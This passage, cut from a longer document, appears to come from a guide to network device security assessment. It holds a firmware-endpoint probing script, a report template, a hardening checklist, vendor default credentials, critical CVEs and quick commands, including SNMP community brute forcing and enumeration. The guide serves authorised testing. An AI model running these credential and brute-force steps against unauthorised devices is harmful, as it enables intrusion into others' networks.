        return banner
```

### 7.3 Firmware Update Bypass

```python
#!/usr/bin/env python3
"""Assess network device firmware update security."""
import requests
import hashlib
import json

class FirmwareUpdateAssessment:
    def __init__(self, device_ip):
        self.device_ip = device_ip

    def test_http_update(self):
        """Check if firmware updates are accepted over HTTP."""
        # Check for update endpoint
        endpoints = [
            "/cgi-bin/firmware",
            "/upgrade",
            "/firmware/upload",
            "/admin/firmware",
            "/api/firmware/update",
        ]

        for endpoint in endpoints:
            try:
                resp = requests.get(
                    f"http://{self.device_ip}{endpoint}",
                    timeout=5,
                    verify=False,
                )
                print(f"[+] Update endpoint found: {endpoint} ({resp.status_code})")
            except:
                pass

    def check_signature_verification(self, firmware_path):
        """Test if device verifies firmware signatures."""
        with open(firmware_path, "rb") as f:
            firmware = f.read()

        # Calculate hashes
        md5 = hashlib.md5(firmware).hexdigest()
        sha256 = hashlib.sha256(firmware).hexdigest()

        print(f"[*] Firmware MD5: {md5}")
        print(f"[*] Firmware SHA256: {sha256}")
        print("[*] Upload firmware and check if signature is verified")
```

---

## 8. Common Pitfalls

### 8.1 Network Device Testing Mistakes

| Mistake | Consequence | Prevention |
|---------|-------------|------------|
| Testing on production device | Network outage | Use lab environment first |
| No configuration backup | Can't recover device | Always backup before testing |
| Ignoring management VLAN | Credential exposure | Use out-of-band management |
| Not monitoring for alerts | Detection during test | Monitor logs and alerts |
| Testing during business hours | Service disruption | Schedule maintenance windows |
| Using default community strings only | Miss SNMPv3 issues | Test all SNMP versions |

### 8.2 Configuration Analysis Pitfalls

```python
# WRONG: Only checking running-config
config = get_running_config()
# This misses:
# - Startup-config differences
# - VLAN database
# - ARP tables
# - MAC address tables

# RIGHT: Comprehensive config collection
def comprehensive_config_collection(device):
    configs = {
        "running": "show running-config",
        "startup": "show startup-config",
        "vlan": "show vlan brief",
        "interfaces": "show interfaces",
        "route": "show ip route",
        "arp": "show arp",
        "snmp": "show snmp",
        "logging": "show logging",
        "crypto": "show crypto key mypubkey rsa",
    }
    for name, command in configs.items():
        run_command(device, command, f"{name}.txt")
```

### 8.3 Reporting Anti-Patterns

| Anti-Pattern | Better Approach |
|-------------|-----------------|
| "SNMP community string is weak" | "SNMP v2c community 'public' allows unauthenticated read access to full MIB, exposing device configuration and credentials" |
| "Device needs firmware update" | "Device firmware v12.4(25) is 8 years old, missing patches for 47 known CVEs including CVE-2018-0171 (CVSS 9.8)" |
| "ACL could be improved" | "Management VLAN ACL permits any-to-any SSH (port 22) access, allowing lateral movement from any network segment" |

---

## 9. Reporting Template

```markdown
# Network Device Security Assessment Report

## Executive Summary
- **Target Scope:** [Device count, types, locations]
- **Assessment Date:** [YYYY-MM-DD]
- **Methodology:** [Configuration audit, penetration test, protocol analysis]
- **Findings:** [Critical: N] [High: N] [Medium: N] [Low: N]

## 1. Device Inventory

| Device | IP | Model | IOS Version | Role | Risk |
|--------|-----|-------|-------------|------|------|
| SW-01 | 10.0.1.1 | WS-C2960X | 15.2(2)E | Access Switch | HIGH |
| FW-01 | 10.0.0.1 | ASA 5525-X | 9.8(1) | Firewall | MEDIUM |

## 2. Findings

### [NET-001]: [Title]
- **Severity:** Critical/High/Medium/Low/Informational
- **CVSS 3.1:** [Score] ([Vector])
- **Affected Devices:** [List]
- **Category:** [Configuration/Firmware/Protocol/Hardware]

**Description:**
[Technical description]

**Evidence:**
```
[Configuration snippets, packet captures, screenshots]
```

**Impact:**
[Business impact]

**Recommendation:**
[Specific configuration changes with example]

## 3. Configuration Audit Results

| Check | Device 1 | Device 2 | Status |
|-------|----------|----------|--------|
| SSH only (no Telnet) | PASS | FAIL | 1 FAIL |
| SNMPv3 enabled | FAIL | FAIL | 2 FAIL |
| AAA configured | PASS | PASS | 2 PASS |
| Secure boot | FAIL | FAIL | 2 FAIL |

## 4. Routing Protocol Security

| Protocol | Authentication | Risk |
|----------|---------------|------|
| OSPF | None | HIGH |
| BGP | MD5 | MEDIUM |
| EIGRP | None | HIGH |

## 5. Recommendations

| Priority | Action | Devices | Effort |
|----------|--------|---------|--------|
| P1 | Enable SNMPv3 | All | Low |
| P1 | Remove Telnet | SW-01 | Low |
| P2 | Enable OSPF authentication | FW-01 | Medium |
| P3 | Update firmware | All | High |

## 6. Appendix

### A. Tools Used
- Netmiko [version]
- Nmap [version]
- Wireshark [version]

### B. Configuration Backups
[Reference to backed-up configurations]
```

---

## 10. Quick Reference

### 10.1 Network Device Security Checklist

```
MANAGEMENT ACCESS:
  [ ] SSH v2 only (no Telnet)
  [ ] Strong passwords (16+ chars)
  [ ] AAA with RADIUS/TACACs+
  [ ] Management ACLs configured
  [ ] Console password protected
  [ ] VTY access restrictions

FIRMWARE:
  [ ] Current firmware version documented
  [ ] Known CVEs reviewed
  [ ] Secure boot enabled
  [ ] Signed firmware verified
  [ ] Update mechanism tested

CONFIGURATION:
  [ ] Running vs startup config compared
  [ ] Default accounts removed
  [ ] Unused services disabled
  [ ] Logging enabled (syslog)
  [ ] NTP synchronized

PROTOCOL SECURITY:
  [ ] OSPF/BGP authentication enabled
  [ ] DHCP snooping enabled
  [ ] Dynamic ARP inspection enabled
  [ ] IP Source Guard enabled
  [ ] Port security configured

PHYSICAL:
  [ ] Console port secured
  [ ] JTAG/UART disabled
  [ ] Physical access restricted
  [ ] Tamper detection (if available)
```

### 10.2 Vendor Default Credentials

| Vendor | Default Username | Default Password |
|--------|-----------------|------------------|
| Cisco | cisco | cisco |
| Juniper | root | (none) |
| Fortinet | admin | (none) |
| Palo Alto | admin | admin |
| MikroTik | admin | (none) |
| Ubiquiti | ubnt | ubnt |
| Huawei | admin | admin |
| HP/Aruba | admin | admin |
| Arista | admin | (none) |

### 10.3 Common CVE Reference

| CVE | Device | Vulnerability | CVSS |
|-----|--------|--------------|------|
| CVE-2018-0171 | Cisco IOS | Smart Install RCE | 9.8 |
| CVE-2023-20198 | Cisco IOS-XE | Web UI Privilege Escalation | 10.0 |
| CVE-2022-20820 | Cisco IOS | SNMP Auth Bypass | 8.6 |
| CVE-2023-46805 | Ivanti | Authentication Bypass | 8.2 |
| CVE-2024-21762 | FortiOS | Out-of-bound Write | 9.8 |
| CVE-2024-3400 | PAN-OS | Command Injection | 10.0 |
| CVE-2015-7755 | Juniper ScreenOS | Backdoor | 10.0 |

### 10.4 Quick Commands

```bash
# Scan network for devices
nmap -sn 192.168.1.0/24 -oG - | grep "Up" | awk '{print $2}'

# SNMP community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt target

# SSH audit
ssh-audit target:22

# Configuration backup (Cisco)
python3 -c "
from netmiko import ConnectHandler
device = ConnectHandler(device_type='cisco_ios', ip='target',
                       username='admin', password='password')
device.enable()
output = device.send_command('show running-config')
with open('backup.txt', 'w') as f: f.write(output)
"

# Quick SNMP enumeration
snmpwalk -v2c -c public target 1.3.6.1.2.1
snmpwalk -v2c -c public target 1.3.6.1.4.1  # Vendor OIDs
```

---

*This guide is for authorized security testing only. Always obtain written permission before testing any system you do not own.*
